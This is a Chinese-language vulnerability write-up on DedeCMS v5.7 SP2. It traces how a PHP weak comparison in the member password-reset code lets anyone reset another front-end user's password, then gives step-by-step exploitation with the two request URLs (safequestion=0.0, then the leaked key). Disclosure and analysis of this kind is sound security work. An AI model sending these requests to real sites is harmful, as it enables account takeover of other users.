## DedeCMS v5.7 SP2_任意修改前台用户密码

## 漏洞描述

dedecms v5.7可以在前台进行任意修改前台用户密码

## 漏洞影响

> DedeCMS v5.7 SP2

## 漏洞分析

漏洞文件：/member/resetpasswordd.php

漏洞分析：下面我们一步一步对整个密码重置的过程进行分析

在resetpasswordd.php文件的开头处首先包含进行了一些配置文件以及功能函数文件，之后接受了一个id变量，用来查询用户：

![1](/resource/DedeCMS-v5.7SP2/1.png)

之后检查dopost是否为空，如果为空则重定向到密码重置模板页面，如果不为空这进行匹配，当dopost为getpwd则对用户输入的验证码、邮箱、用户名的合法性进行校验：

![2](/resource/DedeCMS-v5.7SP2/2.png)

在这里会首先判断找回密码的方式，这里一共提供了两种：

1、邮件方式：首先会检测邮件服务是否开启如果开启则发送邮件，否则给出提示信息

2、安全问题：检测是否有设置安全问题，如果有则重定向到密码重置的第三步，否则给出提示

![3](/resource/DedeCMS-v5.7SP2/3.png)

该漏洞的触发点在于以安全问题找回密码时的不安全性逻辑设计所导致的，所以我们根据流程进入到以"安全问题"找回密码的逻辑代码中继续分析，可以看到这里会根据之前传递进来的用户id作为参数从数据库查询对应的safequestion、safeanswer，之后于用户提供的safequestion以及safeanswer进行判断，但是可以注意到的是此处使用的是————"=="做判断：

![4](/resource/DedeCMS-v5.7SP2/4.png)



当用户没有设置安全问题时，数据库里存储的safequestion默认为"0"，safeanswer默认为'null':

通过php弱类型的转换'0.0' == '0'可以成立，当然在这里直接传0是不行的，因为前面有一个empty的判断，当然你也可以利用十六进制比如:0x0

![5](/resource/DedeCMS-v5.7SP2/5.png)

接下来跟进sn函数，在该函数中会首先进行初始化赋值操作(此处的send为上面传递进来的'N')，之后跟进传递的id进行一次sql查询，之后进行判断，在这里我们直接根据newmail查看发送邮件的函数具体实现：

![6](/resource/DedeCMS-v5.7SP2/6.png)

可以看到当send为'N'时，直接在前端页面返回了验证码(而我们这里刚好默认就是N，见前文)又因为用户id是我们可以控制的safequestion(默认情况)下可以绕过，那么也就达成了修改前台任意用户密码的效果！

![7](/resource/DedeCMS-v5.7SP2/7.png)

#### 漏洞利用

因为这里的模块属于会员模块，包含了member.login.class.php，需要登录才能操作，所以我先注册一个用户，担任攻击者，再注册另外一个用户担任目标：

- 攻击者：test\2\test(用户\ID\密码)
- 攻击目标：test1\3\hacker(用户\ID\密码)

Step1: 登陆test用户

![8](/resource/DedeCMS-v5.7SP2/8.png)



此时系统用户的id分配如下所示：

![9](/resource/DedeCMS-v5.7SP2/9.png)

Step2：发送以下请求url获取key值

```
http://192.168.174.159:88/DedeCms/member/resetpassword.php?dopost=safequestion&safequestion=0.0&id=4
```

![10](/resource/DedeCMS-v5.7SP2/10.png)

Step3：修改请求页URL(下面的key来自上面的请求结果)

```
http://127.0.0.1/dedecms/member/resetpassword.php?dopost=getpasswd&id=4&key=anQZXeG5
```

![11](/resource/DedeCMS-v5.7SP2/11.png)

Step4：修改用户test1的密码为hacker

![12](/resource/DedeCMS-v5.7SP2/12.png)

Step5: 用修改之后的密码登陆进行验证

![13](/resource/DedeCMS-v5.7SP2/13.png)

成功登陆：

![14](/resource/DedeCMS-v5.7SP2/14.png)

![15](/resource/DedeCMS-v5.7SP2/15.png)

